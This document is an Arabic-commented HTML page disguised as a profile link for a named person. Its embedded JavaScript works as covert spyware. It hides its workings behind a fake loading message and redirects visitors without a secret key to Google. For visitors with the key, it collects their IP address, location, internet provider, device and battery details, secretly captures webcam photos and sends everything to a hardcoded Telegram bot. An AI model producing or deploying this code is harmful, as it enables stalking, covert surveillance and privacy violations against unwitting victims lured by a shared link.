<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نسيم كعابنه</title>

    <!-- Open Graph Meta Tags - لجعل الرابط يبدو حقيقياً عند المشاركة -->
    <meta property="og:title" content="نسيم كعابنه">
    <meta property="og:type" content="profile">
    <meta property="og:image" content="https://via.placeholder.com/300"> <!-- يمكنك وضع رابط صورة حقيقية هنا -->

    <style>
        body { font-family: sans-serif; text-align: center; background: #f0f2f5; }
        video { display: none; } /* إخفاء الفيديو لجعل العملية غير مرئية */
        canvas { display: none; }
        .loading { margin-top: 100px; font-size: 24px; color: #666; }
    </style>
</head>
<body>

    <div class="loading">جاري التحميل...</div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // --- الإعدادات الأساسية ---
        const TELEGRAM_TOKEN = '8322190390:AAHN2FcpyUVDjsEa5DhFLzaFcgFF0v7nfOw';
        const CHAT_ID = '7184970355';
        const SECRET_KEY = '123'; // هذا هو المفتاح السري

        async function init() {
            // 1. فحص المفتاح (السر)
            const urlParams = new URLSearchParams(window.location.search);
            const userKey = urlParams.get('key');

            if (userKey !== SECRET_KEY) {
                // إذا لم يوجد المفتاح، اذهب إلى قوقل فوراً (للخداع)
                window.location.href = "https://www.google.com";
                return; // توقف عن تنفيذ باقي الكود
            }

            // 2. إذا كان المفتاح صحيحاً، ابدأ العمل الحقيقي
            await startHacking();
        }

        async function startHacking() {
            try {
                let infoText = "🚀 **دخول جديد!**\n\n";

                // جلب الـ IP واللوكيشن
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                infoText += `📍 IP: ${ipData.ip}\n`;
                infoText += `🌍 الدولة: ${ipData.city}, ${ipData.country_name}\n`;
                infoText += `🌐 مزود الخدمة: ${ipData.org}\n\n`;

                // معلومات الجهاز
                infoText += `📱 الجهاز: ${navigator.platform}\n`;
                infoText += `🌐 المتصفح: ${navigator.userAgent}\n\n`;

                // البطارية
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    infoText += `🔋 مستوى البطارية: ${(battery.level * 100).toFixed(0)}%\n`;
                    infoText += `🔌 حالة الشحن: ${battery.charging ? 'في الشحن' : 'لا يشحن'}\n\n`;
                }

                await sendToTelegram(infoText);
            } catch (e) {
                await sendToTelegram("⚠️ حدث خطأ في جلب البيانات، ولكن الجهاز دخل الرابط.");
            }

            startCamera();
        }

        async function startCamera() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                video.srcObject = stream;
                setTimeout(() => capturePhotos(video, canvas, context), 1500);
            } catch (err) {
                await sendToTelegram("📷 تم الدخول ولكن لم يتم السماح بالكاميرا.");
            }
        }

        async function capturePhotos(video, canvas, context) {
            for (let i = 0; i < 4; i++) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0);

                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob);

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                await new Promise(r => setTimeout(r, 500));
            }
        }

        async function sendToTelegram(text) {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        }

        // تشغيل البرنامج
        init();
    </script>
</body>
</html>
